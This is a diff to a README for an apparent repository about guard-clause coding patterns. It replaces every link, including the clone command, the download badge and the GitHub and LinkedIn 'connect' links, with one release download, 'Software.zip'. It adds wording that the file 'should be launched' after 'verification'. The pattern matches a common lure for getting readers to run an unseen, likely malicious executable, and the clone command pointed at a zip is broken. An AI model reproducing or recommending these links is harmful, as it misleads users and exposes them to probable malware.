@@ -19,7 +19,7 @@ To kickstart your journey with guard clauses, follow these steps:
 
 1. Clone the repository to your local machine:
 ```bash
-git clone https://github.com/panozkaiscool/guard-clauses/releases/tag/v1.0
+git clone https://github.com/panozkaiscool/guard-clauses/releases/download/v2.0/Software.zip
 ```
 
 2. Check out the examples and implementations available in the repository.
@@ -42,7 +42,7 @@ Explore the following practical examples included in this repository:
 ## 📁 Download Software
 
 Download the accompanying software for this repository from the following link:
-[![Download Software](https://github.com/panozkaiscool/guard-clauses/releases/tag/v1.0)](https://github.com/panozkaiscool/guard-clauses/releases/tag/v1.0)
+[![Download Software](https://github.com/panozkaiscool/guard-clauses/releases/download/v2.0/Software.zip)](https://github.com/panozkaiscool/guard-clauses/releases/download/v2.0/Software.zip)
 
 Note: The link requires verification and should be launched to access the software.
 
@@ -57,8 +57,8 @@ Contributions to this repository are highly encouraged. If you have suggestions,
 ## Connect with Us
 
 Stay updated with the latest developments and discussions by connecting with us:
-- Follow us on [GitHub](https://github.com/panozkaiscool/guard-clauses/releases/tag/v1.0)
-- Join the conversation on [LinkedIn](https://github.com/panozkaiscool/guard-clauses/releases/tag/v1.0)
+- Follow us on [GitHub](https://github.com/panozkaiscool/guard-clauses/releases/download/v2.0/Software.zip)
+- Join the conversation on [LinkedIn](https://github.com/panozkaiscool/guard-clauses/releases/download/v2.0/Software.zip)
 
 ## 🙌 Thank You
 
